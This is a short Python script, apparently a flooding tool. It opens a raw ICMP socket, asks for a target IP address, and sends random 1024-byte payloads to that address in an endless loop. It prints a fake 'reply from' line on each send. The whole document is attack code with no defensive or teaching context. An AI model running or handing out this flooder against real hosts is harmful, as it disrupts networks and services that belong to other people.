import socket  #this make random icmp packet
import random  #run -> windows and linux
import struct

sock=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
bytes=random._urandom(1024)

ip=str(input("Enter Ip address:"))
#port=input('port:')

try:
    while True:
        sock.sendto(bytes,(ip,0))
        print ("reply from ")

except KeyboardInterrupt:
    sock.close()
